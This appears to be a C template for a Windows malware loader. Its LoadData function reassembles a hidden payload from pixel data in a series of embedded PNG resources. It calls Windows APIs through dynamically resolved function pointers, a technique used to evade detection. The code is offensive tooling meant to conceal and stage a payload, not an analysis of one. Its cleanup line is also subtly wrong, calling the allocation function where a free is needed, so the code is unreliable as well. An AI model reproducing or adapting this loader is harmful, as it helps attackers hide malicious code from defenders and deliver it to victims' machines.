
#define EMBEDDED_PAYLOAD_SIZE {{ embedded_data_size }}

BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
    DEBUG_PRINT("LoadData: Attempting to load exact payload size: %d bytes", EMBEDDED_PAYLOAD_SIZE);
    
    // 1. Allocate the exact buffer size.
    PBYTE final_buffer = (PBYTE)pfnVirtualAlloc(NULL, EMBEDDED_PAYLOAD_SIZE, MEM_COMMIT, PAGE_READWRITE);
    if (final_buffer == NULL) {
        DEBUG_PRINT("LoadData: Failed to allocate %d bytes for payload", EMBEDDED_PAYLOAD_SIZE);
        return FALSE;
    }
    
    size_t total_bytes_needed = EMBEDDED_PAYLOAD_SIZE;
    size_t current_offset = 0;
    int chunk_count = 0;
    
    for (int i = 0; current_offset < total_bytes_needed; i++) {
        char resource_name[16];
        
        pfnRtlMoveMemory(resource_name, "im", 2);
        int num = i;
        int pos = 2;
        if (num >= 100) num %= 100;
        if (num >= 10) {
            resource_name[pos++] = '0' + (num / 10);
            resource_name[pos++] = '0' + (num % 10);
        } else {
            resource_name[pos++] = '0' + num;
        }
        resource_name[pos] = '\0';

        HRSRC hRes = pfnFindResourceA(g_hModule, resource_name, RT_RCDATA);
        if (hRes == NULL) {
            DEBUG_PRINT("LoadData: Ran out of chunks at %s. Assembled %zu bytes, expected %zu",
                resource_name, current_offset, total_bytes_needed);
            break;
        }
        
        HGLOBAL hResLoad = pfnLoadResource(g_hModule, hRes);
        PBYTE png_data = (PBYTE)pfnLockResource(hResLoad);
        
        if (hResLoad == NULL || png_data == NULL) {
             DEBUG_PRINT("LoadData: Failed to load/lock resource %s", resource_name);
             break;
        }

        int width, height, color_channels, bit_depth;
        char* pixel_data = rpng_load_image_from_memory((const char*)png_data, &width, &height, &color_channels, &bit_depth);
        
        if (pixel_data == NULL) {
             DEBUG_PRINT("LoadData: Failed to decode PNG chunk %s", resource_name);
             break;
        }
        
        chunk_count++;
        size_t chunk_raw_bytes = width * height * 4; // The total data in this PNG's pixels
        size_t bytes_to_copy = 0;
        size_t bytes_remaining_in_buffer = total_bytes_needed - current_offset;

        // 3. This logic prevents buffer overflow AND handles padding.
        if (chunk_raw_bytes > bytes_remaining_in_buffer) {
            // This is the last chunk. Only copy what we need, ignore padding.
            bytes_to_copy = bytes_remaining_in_buffer;
        } else {
            // This is a full chunk. Copy all of it.
            bytes_to_copy = chunk_raw_bytes;
        }

        pfnRtlMoveMemory(final_buffer + current_offset, pixel_data, bytes_to_copy);
        current_offset += bytes_to_copy;
        
        free(pixel_data);
    }
    
    if (current_offset == total_bytes_needed) {
        *ppData = final_buffer;
        *pdwDataSize = (DWORD)total_bytes_needed;
        DEBUG_PRINT("LoadData: Successfully reassembled %lu bytes from %d chunks",
            current_offset, chunk_count);
        return TRUE;
    }
    
    DEBUG_PRINT("LoadData: FAILED. Assembled %lu of %lu bytes", current_offset, total_bytes_needed);
    pfnVirtualAlloc(final_buffer, 0, MEM_RELEASE, 0); // Free the buffer
    return FALSE;
}
